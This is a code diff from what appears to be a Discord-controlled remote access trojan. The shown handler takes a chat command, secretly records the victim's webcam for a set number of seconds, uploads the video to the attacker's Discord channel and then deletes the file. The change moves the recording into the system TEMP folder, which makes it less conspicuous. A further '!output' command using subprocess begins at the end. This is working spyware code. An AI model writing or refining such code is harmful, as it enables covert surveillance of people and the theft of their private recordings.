@@ -193,7 +193,8 @@ async def on_message(message):
             capture_duration = int(message.content[11:])
             cap = cv2.VideoCapture(0)
             fourcc = cv2.VideoWriter_fourcc(*'XVID')
-            out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))
+            out = cv2.VideoWriter(os.path.join(
+                os.getenv('TEMP') + 'output.avi'), fourcc, 20.0, (640, 480))
             start_time = time.time()
             while(int(time.time() - start_time) < capture_duration):
                 ret, frame = cap.read()
@@ -204,9 +205,12 @@ async def on_message(message):
             cap.release()
             out.release()
             cv2.destroyAllWindows()
-            file = discord.File("output.avi", filename="output.avi")
+            file = discord.File(os.path.join(
+                os.getenv('TEMP') + 'output.avi'), filename="output.avi")
             await  message.channel.send("[*] Command successfuly executed", file=file)
-            os.popen("del output.avi")
+            # os.popen("del output.avi")
+            os.remove(os.path.join(
+                os.getenv('TEMP') + 'output.avi'))
 
         if message.content.startswith("!output"):
             import subprocess
